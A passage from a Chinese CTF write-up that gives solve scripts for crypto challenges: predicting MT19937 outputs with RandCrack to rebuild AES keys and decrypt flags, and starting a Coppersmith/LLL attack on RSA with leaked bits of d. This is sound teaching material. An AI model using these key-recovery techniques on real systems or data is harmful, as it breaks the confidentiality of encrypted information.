class="number">2864951447</span>, <span class="number">514648741</span>, <span class="number">887020932</span>, <span class="number">166121609</span>, <span class="number">476244781</span>, <span class="number">2238614863</span>, <span class="number">3039706334</span>, <span class="number">3586500526</span>, <span class="number">3038068930</span>, <span class="number">3989751746</span>, <span class="number">3699955508</span>, <span class="number">3559348520</span>, <span class="number">884358906</span>, <span class="number">444882591</span>, <span class="number">3769021913</span>, <span class="number">3665754928</span>, <span class="number">1911261614</span>, <span class="number">1234192084</span>, <span class="number">3450557803</span>, <span class="number">3232410240</span>, <span class="number">494096069</span>, <span class="number">660552292</span>, <span class="number">1365481833</span>, <span class="number">520081058</span>, <span class="number">1027987838</span>, <span class="number">3165505556</span>, <span class="number">1257833693</span>, <span class="number">2146291679</span>, <span class="number">3634622224</span>, <span class="number">589123893</span>, <span class="number">1195030125</span>, <span class="number">1602406253</span>, <span class="number">772753497</span>, <span class="number">2661121530</span>, <span class="number">2938530200</span>, <span class="number">1070706826</span>, <span class="number">3890477657</span>, <span class="number">2112901265</span>, <span class="number">4253917692</span>, <span class="number">2291562806</span>, <span class="number">67613984</span>, <span class="number">2608069358</span>, <span class="number">1726139310</span>, <span class="number">3018885048</span>, <span class="number">367067728</span>, <span class="number">3838771641</span>, <span class="number">1357927847</span>, <span class="number">2616452172</span>, <span class="number">722979624</span>, <span class="number">4153031784</span>, <span class="number">607660099</span>, <span class="number">3164865398</span>, <span class="number">3199368055</span>, <span class="number">1885230388</span>, <span class="number">1055777913</span>, <span class="number">3475913336</span>, <span class="number">1546318749</span>, <span class="number">578282810</span>, <span class="number">1558944130</span>, <span class="number">2955660875</span>, <span class="number">2214838829</span>, <span class="number">4202836988</span>, <span class="number">1405916968</span>, <span class="number">2593459723</span>, <span class="number">3648360966</span>, <span class="number">3644813488</span>, <span class="number">598912719</span>, <span class="number">876098814</span>, <span class="number">355483438</span>, <span class="number">685352898</span>, <span class="number">4099087273</span>, <span class="number">2983380912</span>, <span class="number">450980374</span>, <span class="number">2753208777</span>, <span class="number">429297943</span>, <span class="number">3462109454</span>, <span class="number">3134522829</span>, <span class="number">2064548393</span>, <span class="number">2200750558</span>, <span class="number">4247753845</span>, <span class="number">251220053</span>, <span class="number">1556849099</span>, <span class="number">2022648175</span>, <span class="number">3563632884</span>, <span class="number">2175932589</span>, <span class="number">1463719656</span>, <span class="number">1887673611</span>, <span class="number">3541708446</span>, <span class="number">3033219582</span>, <span class="number">3255799816</span>, <span class="number">534398633</span>, <span class="number">3481196045</span>, <span class="number">825005812</span>, <span class="number">1629237540</span>, <span class="number">640085217</span>, <span class="number">899503755</span>, <span class="number">3105157116</span>, <span class="number">488231507</span>, <span class="number">2708835929</span>, <span class="number">2648663900</span>, <span class="number">2048030022</span>, <span class="number">1503411342</span>, <span class="number">4059850866</span>, <span class="number">1281156549</span>, <span class="number">3171426598</span>, <span class="number">2637361895</span>, <span class="number">1110841056</span>, <span class="number">606897504</span>, <span class="number">3001264062</span>, <span class="number">912267483</span>, <span class="number">148124465</span>, <span class="number">202684836</span>, <span class="number">1425732680</span>, <span class="number">3637635336</span>, <span class="number">1455737055</span>, <span class="number">2977077407</span>, <span class="number">54987379</span>, <span class="number">1056796337</span>, <span class="number">1832170261</span>, <span class="number">1870208138</span>, <span class="number">4074249428</span>, <span class="number">2993704297</span>, <span class="number">381772606</span>, <span class="number">2362720677</span>, <span class="number">2164369676</span>, <span class="number">250156737</span>, <span class="number">3409786877</span>, <span class="number">1590821450</span>, <span class="number">2959971180</span>, <span class="number">3682255149</span>, <span class="number">302283211</span>, <span class="number">4204651015</span>, <span class="number">1294232346</span>, <span class="number">3088162584</span>, <span class="number">4209012441</span>, <span class="number">784333825</span>, <span class="number">1275400791</span>, <span class="number">885466807</span>, <span class="number">1249631254</span>, <span class="number">1236809354</span>, <span class="number">2627231325</span>, <span class="number">2391839654</span>, <span class="number">1638467843</span>, <span class="number">2797229961</span>, <span class="number">3799496431</span>, <span class="number">237846505</span>, <span class="number">3432655604</span>, <span class="number">1690038717</span>, <span class="number">1493561006</span>, <span class="number">4229115929</span>, <span class="number">3784624191</span>, <span class="number">2891696687</span>, <span class="number">3557702324</span>, <span class="number">1120718375</span>, <span class="number">2593253432</span>, <span class="number">1415584860</span>, <span class="number">551110044</span>, <span class="number">1510986691</span>, <span class="number">3267929936</span>, <span class="number">2341598281</span>, <span class="number">247215742</span>, <span class="number">3192053018</span>, <span class="number">2856032615</span>, <span class="number">3290505354</span>, <span class="number">907961089</span>, <span class="number">4128700570</span>, <span class="number">4195745607</span>, <span class="number">2035634741</span>, <span class="number">1047086449</span>, <span class="number">216435127</span>, <span class="number">1997121891</span>, <span class="number">3391563810</span>, <span class="number">2813128796</span>, <span class="number">1517545322</span>]</span><br><span class="line"></span><br><span class="line">k2 = [<span class="number">2137201486</span>, <span class="number">2243095490</span>, <span class="number">3817098931</span>, <span class="number">229608464</span>, <span class="number">73854451</span>, <span class="number">2470370137</span>, <span class="number">647955184</span>, <span class="number">1997583099</span>, <span class="number">2122796155</span>, <span class="number">3754429965</span>, <span class="number">915090235</span>, <span class="number">3330907022</span>, <span class="number">4045925639</span>, <span class="number">1616378187</span>, <span class="number">3477748127</span>, <span class="number">3235608209</span>, <span class="number">4168058459</span>, <span class="number">137624259</span>, <span class="number">2992531650</span>, <span class="number">509166204</span>, <span class="number">3920545433</span>, <span class="number">1915159362</span>, <span class="number">3901263233</span>, <span class="number">4228481818</span>, <span class="number">2816405167</span>, <span class="number">1786108715</span>, <span class="number">3305752402</span>, <span class="number">2384763695</span>, <span class="number">227465801</span>, <span class="number">1052658065</span>, <span class="number">3153900057</span>, <span class="number">117311308</span>, <span class="number">1595474528</span>, <span class="number">1087880165</span>, <span class="number">3166831564</span>, <span class="number">1588364714</span>, <span class="number">528237288</span>, <span class="number">617272354</span>, <span class="number">618281932</span>, <span class="number">1618791873</span>, <span class="number">3810883062</span>, <span class="number">894018392</span>, <span class="number">2575794219</span>, <span class="number">103568311</span>, <span class="number">3298607681</span>, <span class="number">536028939</span>, <span class="number">3467146346</span>, <span class="number">2201685940</span>, <span class="number">1076138845</span>, <span class="number">918210863</span>, <span class="number">1341794665</span>, <span class="number">3456513087</span>, <span class="number">1710914773</span>, <span class="number">1894309846</span>, <span class="number">2312381988</span>, <span class="number">127727152</span>, <span class="number">876614149</span>, <span class="number">1709878784</span>, <span class="number">1156541415</span>, <span class="number">1555452594</span>, <span class="number">182448271</span>, <span class="number">408344822</span>, <span class="number">2898434231</span>, <span class="number">1998211488</span>, <span class="number">3592206445</span>, <span class="number">1085073460</span>, <span class="number">3397525879</span>, <span class="number">663024038</span>, <span class="number">3434587726</span>, <span class="number">2768736843</span>, <span class="number">617681814</span>, <span class="number">2865397550</span>, <span class="number">3463093384</span>, <span class="number">2746629701</span>, <span class="number">2006818690</span>, <span class="number">1121017677</span>, <span class="number">2047400279</span>, <span class="number">1921768902</span>, <span class="number">528024592</span>, <span class="number">2892263293</span>, <span class="number">2798869302</span>, <span class="number">3481658697</span>, <span class="number">2848153687</span>, <span class="number">1134481165</span>, <span class="number">3720776629</span>, <span class="number">486120970</span>, <span class="number">2683483151</span>, <span class="number">3252410704</span>, <span class="number">2891974166</span>, <span class="number">2121509882</span>, <span class="number">4160792826</span>, <span class="number">2915283137</span>, <span class="number">4014112386</span>, <span class="number">1792273527</span>, <span class="number">805496405</span>, <span class="number">1407962158</span>, <span class="number">3622679727</span>, <span class="number">3512697173</span>, <span class="number">2901255951</span>, <span class="number">3111681208</span>, <span class="number">2877903904</span>, <span class="number">827923100</span>, <span class="number">3729787569</span>, <span class="number">925768344</span>, <span class="number">923906770</span>, <span class="number">3606973890</span>, <span class="number">1181029191</span>, <span class="number">689515782</span>, <span class="number">1651144572</span>, <span class="number">3459362488</span>, <span class="number">2412684107</span>, <span class="number">1362064386</span>, <span class="number">4159398924</span>, <span class="number">2922809145</span>, <span class="number">1602978249</span>, <span class="number">3705882625</span>, <span class="number">4293462677</span>, <span class="number">764953390</span>, <span class="number">4178674632</span>, <span class="number">2074025926</span>, <span class="number">1925824438</span>, <span class="number">2523046149</span>, <span class="number">1263372335</span>, <span class="number">1677306491</span>, <span class="number">760292173</span>, <span class="number">3736532489</span>, <span class="number">2036587975</span>, <span class="number">514100070</span>, <span class="number">706857874</span>, <span class="number">1060105302</span>, <span class="number">2578078966</span>, <span class="number">2320134376</span>, <span class="number">3639164974</span>, <span class="number">1710455599</span>, <span class="number">45505402</span>, <span class="number">2407597519</span>, <span class="number">2537656373</span>, <span class="number">56251495</span>, <span class="number">1630733521</span>, <span class="number">519864415</span>, <span class="number">1444518872</span>, <span class="number">513906964</span>, <span class="number">3852284907</span>, <span class="number">800496493</span>, <span class="number">872675679</span>, <span class="number">3155530732</span>, <span class="number">683268660</span>, <span class="number">3856797215</span>, <span class="number">137673146</span>, <span class="number">3607443770</span>, <span class="number">3700387644</span>, <span class="number">965766446</span>, <span class="number">2454233777</span>, <span class="number">954672952</span>, <span class="number">2855774032</span>, <span class="number">3552757435</span>, <span class="number">3025907069</span>, <span class="number">1402938518</span>, <span class="number">3041387870</span>, <span class="number">3456472325</span>, <span class="number">447871942</span>, <span class="number">1327563590</span>, <span class="number">620160190</span>, <span class="number">1007188755</span>, <span class="number">180115074</span>, <span class="number">52020277</span>, <span class="number">1774723235</span>, <span class="number">2887773879</span>, <span class="number">3508414970</span>, <span class="number">3631951842</span>, <span class="number">1763635376</span>, <span class="number">1924307117</span>, <span class="number">4204987693</span>, <span class="number">2494477117</span>, <span class="number">4017134019</span>, <span class="number">368620157</span>, <span class="number">2814392181</span>, <span class="number">2199699352</span>, <span class="number">1158269085</span>, <span class="number">2580589087</span>, <span class="number">1747804339</span>, <span class="number">1012560482</span>, <span class="number">933361529</span>, <span class="number">176586313</span>, <span class="number">2808905110</span>, <span class="number">83750114</span>, <span class="number">3090684109</span>, <span class="number">1767704883</span>, <span class="number">4189833886</span>, <span class="number">4249260150</span>, <span class="number">2157821862</span>, <span class="number">2112716220</span>, <span class="number">261010276</span>, <span class="number">3168798078</span>, <span class="number">1920566780</span>, <span class="number">1823590666</span>, <span class="number">2244335700</span>, <span class="number">2816218464</span>, <span class="number">3295774792</span>, <span class="number">2283997010</span>, <span class="number">3733740723</span>, <span class="number">3169836042</span>, <span class="number">1782097885</span>, <span class="number">1421909608</span>, <span class="number">3071286976</span>, <span class="number">2529056825</span>, <span class="number">2917504380</span>, <span class="number">2500113967</span>, <span class="number">1340022169</span>, <span class="number">1325786585</span>, <span class="number">2696541388</span>, <span class="number">3763160733</span>, <span class="number">3603998832</span>, <span class="number">72655495</span>, <span class="number">2892272720</span>, <span class="number">2785458061</span>, <span class="number">1724578654</span>, <span class="number">2144338844</span>, <span class="number">2899719547</span>, <span class="number">318345339</span>, <span class="number">2511462884</span>, <span class="number">3220707099</span>, <span class="number">1676208778</span>, <span class="number">2586878575</span>, <span class="number">3209502577</span>, <span class="number">3013180194</span>, <span class="number">2700788434</span>, <span class="number">3611106949</span>, <span class="number">1712906930</span>, <span class="number">3381158761</span>, <span class="number">962420077</span>, <span class="number">1928661992</span>, <span class="number">1241692316</span>, <span class="number">3587734972</span>, <span class="number">2361851891</span>, <span class="number">729570171</span>, <span class="number">1255993130</span>, <span class="number">2059230370</span>, <span class="number">3819451535</span>, <span class="number">2490865889</span>, <span class="number">1229457976</span>, <span class="number">3062266381</span>, <span class="number">3350574651</span>, <span class="number">1861939269</span>, <span class="number">3074031276</span>, <span class="number">1122137253</span>, <span class="number">3267903554</span>, <span class="number">2691684836</span>, <span class="number">3042505532</span>, <span class="number">1103427454</span>, <span class="number">2126863565</span>, <span class="number">3686667924</span>, <span class="number">4181984974</span>, <span class="number">238390653</span>, <span class="number">2037278833</span>, <span class="number">2930470784</span>, <span class="number">424623283</span>, <span class="number">3074336567</span>, <span class="number">4019540123</span>, <span class="number">447553681</span>, <span class="number">491252047</span>, <span class="number">2134100060</span>, <span class="number">3683266682</span>, <span class="number">2218397687</span>, <span class="number">1535505498</span>, <span class="number">628745497</span>, <span class="number">445350701</span>, <span class="number">186184731</span>, <span class="number">3190072310</span>, <span class="number">1084556173</span>, <span class="number">277509904</span>, <span class="number">2898643406</span>, <span class="number">4292667973</span>, <span class="number">2903270520</span>, <span class="number">2565372604</span>, <span class="number">303440546</span>, <span class="number">1808627640</span>, <span class="number">3069152665</span>, <span class="number">2075086265</span>, <span class="number">350493108</span>, <span class="number">3426866771</span>, <span class="number">1167370872</span>, <span class="number">2856612905</span>, <span class="number">1133769957</span>, <span class="number">2168578594</span>, <span class="number">361418126</span>, <span class="number">1788736419</span>, <span class="number">3450707887</span>, <span class="number">1988560242</span>, <span class="number">3106183307</span>, <span class="number">420765626</span>, <span class="number">1595814948</span>, <span class="number">813997149</span>, <span class="number">2474462651</span>, <span class="number">3945801301</span>, <span class="number">1785414095</span>, <span class="number">4177305184</span>, <span class="number">3071687740</span>, <span class="number">1273724577</span>, <span class="number">4178527412</span>,</span><br><span class="line">      <span class="number">2536332142</span>, <span class="number">2692000853</span>, <span class="number">2172897829</span>, <span class="number">1472311250</span>, <span class="number">1630835977</span>, <span class="number">2274186143</span>, <span class="number">3947343331</span>, <span class="number">1836099636</span>, <span class="number">3955763613</span>, <span class="number">271610193</span>, <span class="number">2479541262</span>, <span class="number">3666471942</span>, <span class="number">4217699594</span>, <span class="number">341808580</span>, <span class="number">1517926781</span>, <span class="number">3311123634</span>, <span class="number">1738600938</span>, <span class="number">3870938757</span>, <span class="number">2309182531</span>, <span class="number">3189576099</span>, <span class="number">1594683626</span>, <span class="number">1900151562</span>, <span class="number">3625455382</span>, <span class="number">3527220315</span>, <span class="number">471268317</span>, <span class="number">4085391597</span>, <span class="number">1205291118</span>, <span class="number">1903466784</span>, <span class="number">934489768</span>, <span class="number">717103328</span>, <span class="number">407385599</span>, <span class="number">1146912039</span>, <span class="number">2148396650</span>, <span class="number">3906209540</span>, <span class="number">3002211292</span>, <span class="number">4003244728</span>, <span class="number">1595357238</span>, <span class="number">4224659669</span>, <span class="number">3679773598</span>, <span class="number">1554305724</span>, <span class="number">1879798896</span>, <span class="number">856183762</span>, <span class="number">2448013518</span>, <span class="number">2839667183</span>, <span class="number">3541976537</span>, <span class="number">1201501683</span>, <span class="number">2210517506</span>, <span class="number">3074699110</span>, <span class="number">2545660131</span>, <span class="number">3696626258</span>, <span class="number">1684534318</span>, <span class="number">3093429986</span>, <span class="number">2603224784</span>, <span class="number">3784468515</span>, <span class="number">1931537793</span>, <span class="number">570789340</span>, <span class="number">376758771</span>, <span class="number">2307788100</span>, <span class="number">2180860578</span>, <span class="number">201860820</span>, <span class="number">3293433128</span>, <span class="number">1396840567</span>, <span class="number">2231737923</span>, <span class="number">3343569549</span>, <span class="number">890147328</span>, <span class="number">3369945506</span>, <span class="number">3155052764</span>, <span class="number">4225372249</span>, <span class="number">3097945008</span>, <span class="number">1976073442</span>, <span class="number">1939061106</span>, <span class="number">3009821364</span>, <span class="number">3636790064</span>, <span class="number">1722351481</span>, <span class="number">571067187</span>, <span class="number">3660829870</span>, <span class="number">625774796</span>, <span class="number">962877120</span>, <span class="number">4093260308</span>, <span class="number">2994561947</span>, <span class="number">1780515932</span>, <span class="number">4180215026</span>, <span class="number">4252365298</span>, <span class="number">2947348994</span>, <span class="number">2484307881</span>, <span class="number">1869054839</span>, <span class="number">1567538899</span>, <span class="number">2381016872</span>, <span class="number">650248596</span>, <span class="number">2837463974</span>, <span class="number">3547259433</span>, <span class="number">1653667021</span>, <span class="number">276270749</span>, <span class="number">1685266082</span>, <span class="number">3605301102</span>, <span class="number">3560229703</span>, <span class="number">3732548108</span>, <span class="number">3643340502</span>, <span class="number">2787020632</span>, <span class="number">301650068</span>, <span class="number">1692193275</span>, <span class="number">3053122330</span>, <span class="number">446613045</span>, <span class="number">753748541</span>, <span class="number">3639322954</span>, <span class="number">2521151846</span>, <span class="number">3846032512</span>, <span class="number">2540737292</span>, <span class="number">1022192711</span>, <span class="number">4242180248</span>, <span class="number">2050165414</span>, <span class="number">2033316505</span>, <span class="number">3063183472</span>, <span class="number">2547887329</span>, <span class="number">1562411323</span>, <span class="number">2846186023</span>, <span class="number">1057549601</span>, <span class="number">200005518</span>, <span class="number">2515317663</span>, <span class="number">614142733</span>, <span class="number">2822762719</span>, <span class="number">1111596810</span>, <span class="number">730033186</span>, <span class="number">3539522165</span>, <span class="number">2876952827</span>, <span class="number">1093300071</span>, <span class="number">2988803720</span>, <span class="number">2788643910</span>, <span class="number">1815173676</span>, <span class="number">923492540</span>, <span class="number">1571870569</span>, <span class="number">1732017323</span>, <span class="number">3912738621</span>, <span class="number">1932484987</span>, <span class="number">1369226061</span>, <span class="number">1043943980</span>, <span class="number">659920686</span>, <span class="number">87860672</span>, <span class="number">3117771700</span>, <span class="number">536701</span>, <span class="number">1276716714</span>, <span class="number">399069847</span>, <span class="number">675178237</span>, <span class="number">4148780498</span>, <span class="number">2293633457</span>, <span class="number">510556418</span>, <span class="number">3306441120</span>, <span class="number">3969884840</span>, <span class="number">931665570</span>, <span class="number">1269866789</span>, <span class="number">1486094185</span>, <span class="number">1896845492</span>, <span class="number">2955478105</span>, <span class="number">3949294788</span>, <span class="number">2483398248</span>, <span class="number">2792552965</span>, <span class="number">367597061</span>, <span class="number">955979053</span>, <span class="number">4141216471</span>, <span class="number">3162398417</span>, <span class="number">783759084</span>, <span class="number">605101703</span>, <span class="number">3200303074</span>, <span class="number">1835668453</span>, <span class="number">3586071304</span>, <span class="number">2174558649</span>, <span class="number">2997422459</span>, <span class="number">3634493394</span>, <span class="number">4138976583</span>, <span class="number">164027380</span>, <span class="number">490279465</span>, <span class="number">2469644175</span>, <span class="number">43130477</span>, <span class="number">1547916166</span>, <span class="number">2406583577</span>, <span class="number">1303190434</span>, <span class="number">1431585058</span>, <span class="number">1519905099</span>, <span class="number">1079834268</span>, <span class="number">231749295</span>, <span class="number">1635997362</span>, <span class="number">1423407810</span>, <span class="number">2814537500</span>, <span class="number">2894136671</span>, <span class="number">3686889877</span>, <span class="number">1812711299</span>, <span class="number">4226627996</span>, <span class="number">3754118359</span>, <span class="number">20804048</span>, <span class="number">4285391186</span>, <span class="number">2958387414</span>, <span class="number">2233166520</span>, <span class="number">3070925064</span>, <span class="number">1320913219</span>, <span class="number">2976334802</span>, <span class="number">4041836979</span>, <span class="number">382095839</span>, <span class="number">1388937175</span>, <span class="number">1819247059</span>, <span class="number">3838255239</span>, <span class="number">3380204370</span>, <span class="number">3935811842</span>, <span class="number">2751480313</span>, <span class="number">164540071</span>, <span class="number">2340071112</span>, <span class="number">610666648</span>, <span class="number">595972300</span>, <span class="number">2011517128</span>, <span class="number">213838138</span>, <span class="number">4255091509</span>, <span class="number">3777157969</span>, <span class="number">2402199559</span>, <span class="number">3852693289</span>, <span class="number">4206005132</span>, <span class="number">3787527275</span>, <span class="number">1471785983</span>, <span class="number">2589388076</span>, <span class="number">631286274</span>, <span class="number">3524096200</span>, <span class="number">590972337</span>, <span class="number">1887865600</span>, <span class="number">1760603763</span>, <span class="number">643231370</span>, <span class="number">2643740969</span>, <span class="number">2388499010</span>, <span class="number">1722852753</span>, <span class="number">645073667</span>, <span class="number">3177739276</span>, <span class="number">1242181637</span>, <span class="number">2984331308</span>, <span class="number">567911875</span>, <span class="number">753620395</span>, <span class="number">3743678155</span>, <span class="number">4278357119</span>, <span class="number">2815496781</span>, <span class="number">1270587449</span>, <span class="number">4259346098</span>, <span class="number">589049437</span>, <span class="number">3257834517</span>, <span class="number">3637173709</span>, <span class="number">2882662502</span>, <span class="number">2892380404</span>, <span class="number">1843952012</span>, <span class="number">2832065071</span>, <span class="number">1053718106</span>, <span class="number">330418109</span>, <span class="number">3909969653</span>, <span class="number">916711438</span>, <span class="number">3709287944</span>, <span class="number">2455153252</span>, <span class="number">763050070</span>, <span class="number">1667025352</span>, <span class="number">3019273370</span>, <span class="number">3814458403</span>, <span class="number">1093369006</span>, <span class="number">3332713718</span>, <span class="number">752637853</span>, <span class="number">100085835</span>, <span class="number">523535862</span>, <span class="number">4068027345</span>, <span class="number">1845694557</span>, <span class="number">2754500540</span>, <span class="number">3395089568</span>, <span class="number">2675873208</span>, <span class="number">525907800</span>, <span class="number">937117572</span>, <span class="number">3313729567</span>, <span class="number">1112554253</span>, <span class="number">114888315</span>, <span class="number">619966459</span>, <span class="number">1641381760</span>, <span class="number">1017743298</span>, <span class="number">1178701646</span>, <span class="number">1581336326</span>, <span class="number">362103885</span>, <span class="number">3516308826</span>, <span class="number">869224156</span>, <span class="number">376989708</span>, <span class="number">633412018</span>, <span class="number">1074308065</span>, <span class="number">3818889570</span>, <span class="number">4249601414</span>, <span class="number">2417156426</span>, <span class="number">2229939059</span>, <span class="number">1313267093</span>, <span class="number">2929434755</span>, <span class="number">783116601</span>, <span class="number">1643811645</span>, <span class="number">996372459</span>, <span class="number">3352907069</span>, <span class="number">953035592</span>, <span class="number">1641549976</span>, <span class="number">2112115418</span>, <span class="number">1350813227</span>, <span class="number">3528081888</span>, <span class="number">1136982588</span>, <span class="number">1390912242</span>, <span class="number">2659886726</span>, <span class="number">1031606598</span>, <span class="number">2617877628</span>]</span><br><span class="line">c1 = <span class="string">b&#x27;\x04\xd6k\xe5:\x9a\xabu\xb3\r\x06\xd9\x8e\x04\x87\xc7\x10\xecv\x0bG,\x9c\xb5\xb5q\xd6\x9c\xb8\xb7\xb1d&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;CT\x1a&gt;\x12\x8ff&quot;\x89\xde\x9a\x0f\xf4\xac\xa2\xe7\xd2%\x15\xdd`\x03\xf4?u\x07#\xf9\x03\xde\xd4\x97&#x27;</span></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> k1:</span><br><span class="line">    rc.submit(num)</span><br><span class="line">cal = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    cal += rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">aes1 = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag1 = aes1.decrypt(c1).decode()</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>):</span><br><span class="line">    rc.submit(k2[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>, <span class="number">624</span>):</span><br><span class="line">    rc.submit(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">cal = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>//<span class="number">4</span>):</span><br><span class="line">    cal += rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">aes2 = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag2 = aes2.decrypt(c2).decode()</span><br><span class="line">flag = flag1+flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里考察的是<code>MT19937</code>随机数生成算法，在<code>flag1</code>中由于我们知道了前一轮的所有随机数(624个随机数)，因此我们可以通过<code>RandCrack()</code>预测下一轮的随机数</p><p>而<code>flag2</code>中，题目只给了我们前600个随机数，还缺少24个随机数才能组成一轮完整的<code>state</code>，于是我有个大胆的想法，给它随机的24个随机数会怎么样，结果误打误撞解出<code>flag</code>了，想查查到底是什么原因，但都没找到相关的介绍，都是教我怎么逆<code>MT19937</code>算法的跟简单介绍，貌似用处不大</p><p>但，伟大的糖醋小鸡块师傅在他的博客中帮我解疑了，Orz<br /><a href="https://tangcuxiaojikuai.xyz/post/1dda48e6.html">https://tangcuxiaojikuai.xyz/post/1dda48e6.html</a><br /><img src="https://pica.zhimg.com/80/v2-ad782de3e2c583d1d9b7a9f04d5e9bd2_1440w.png" alt="" /></p><h3 id="baby_rsa"><a class="markdownIt-Anchor" href="#baby_rsa"></a> baby_rsa</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://github.com/jvdsn/crypto-attacks</span></span><br><span class="line">n = <span class="number">149172698687247343307484774427463947040435385939538317995577802933708356659744781308849658149199463270402946054959026247011496643609722381036883462993606208405454448793748282856217226973570288117498818638210423816294135228225752144034736417495450129714250843040389723696691326017062575682989124677170212774709</span></span><br><span class="line">e = <span class="number">117932126002671581139669626170313849654365346787524775666511151162210096339679521576248537514813055641658722582914817481701142826861992970974206985137736311670025047752207632786439134855261541672012123572997654885689727972923659090161642085293034838535696206768459211817851404605357080649176502772728128885161</span></span><br><span class="line">c = <span class="number">5560665954852260703690321742771294743847646190564920056638605621636133720600072404637746086157764356927591996611862975162275415163691292729424412545560091018172812509230401361899309377868998693154480684535377865697939714965280441927137203589475324582174585416573174423912557361267766810988676863548944796515</span></span><br><span class="line">dm = <span class="number">0x2498aa4c85de5a33d5766f28d879f0df7175f43dd71cd4ab56ab67bf76334e6e3dcb</span></span><br><span class="line">dl = <span class="number">0x4c21c14305c34ed8f5e8879452c4ce569ce0789e6b39</span></span><br><span class="line">d_zj=???</span><br></pre></td></tr></table></figure><p><code>d</code>的高低位泄露，见糖醋小鸡块师傅的<a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html">高校密码挑战赛赛题5</a>，这里一样猜测<code>d.bit_lengths()=512</code></p><p>由于我使用的是<code>sage10.4</code>与师傅使用到的<code>sage10.2</code>不一样，脚本使用到的部分函数在10.4版本中已经进行了调整，不会改脚本了QWQ</p><p><a href="https://dawn1ight.github.io/post/23197/#week4-baby-rsa">后续参考</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment">#coppersmith</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficients_monomials()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = <span class="number">149172698687247343307484774427463947040435385939538317995577802933708356659744781308849658149199463270402946054959026247011496643609722381036883462993606208405454448793748282856217226973570288117498818638210423816294135228225752144034736417495450129714250843040389723696691326017062575682989124677170212774709</span></span><br><span class="line">e = <span class="number">117932126002671581139669626170313849654365346787524775666511151162210096339679521576248537514813055641658722582914817481701142826861992970974206985137736311670025047752207632786439134855261541672012123572997654885689727972923659090161642085293034838535696206768459211817851404605357080649176502772728128885161</span></span><br><span class="line">c = <span class="number">5560665954852260703690321742771294743847646190564920056638605621636133720600072404637746086157764356927591996611862975162275415163691292729424412545560091018172812509230401361899309377868998693154480684535377865697939714965280441927137203589475324582174585416573174423912557361267766810988676863548944796515</span></span><br><span class="line">dm = <span class="number">0x2498aa4c85de5a33d5766f28d879f0df7175f43dd71cd4ab56ab67bf76334e6e3dcb</span></span><br><span class="line">dl = <span class="number">0x4c21c14305c34ed8f5e8879452c4ce569ce0789e6b39</span></span><br><span class="line"></span><br><span class="line">leakh = <span class="number">270</span></span><br><span 